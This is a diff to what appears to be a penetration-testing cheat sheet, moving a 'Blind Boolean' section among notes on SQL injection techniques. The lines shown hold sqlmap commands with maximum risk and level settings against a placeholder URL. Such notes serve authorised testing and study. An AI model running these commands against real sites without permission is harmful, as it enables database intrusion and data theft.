@@ -62,16 +62,6 @@ Try the simpler/faster techniques (of `BEUSTQ`) first to find easy wins, but
 sqlmap --risk 3 --level 5 --technique=EUBS --batch -u "<URL>"
 ```
 
-#### Blind Boolean
-
-Infer data from whether the page content or behaviour changes (true vs false).
-
-**NOTE:** careful this is a very unstable method that might require multiple runs or `--no-cast`
-
-```bash
-sqlmap --technique=B --level 5 --risk 3 -u "<URL>"
-```
-
 #### Error-based
 
 Trigger DB errors that leak data inside the error message.
@@ -86,6 +76,16 @@ Combine two queries to dump data directly into the response. Count the displayed
 
 ```bash
 sqlmap --technique=U --union-cols=5 -u "<URL>"
+```
+
+#### Blind Boolean
+
+Infer data from whether the page content or behaviour changes (true vs false).
+
+**NOTE:** careful this is a very unstable method that might require multiple runs or `--no-cast`
+
+```bash
+sqlmap --technique=B --level 5 --risk 3 -u "<URL>"
 ```
 
 #### Stacked queries
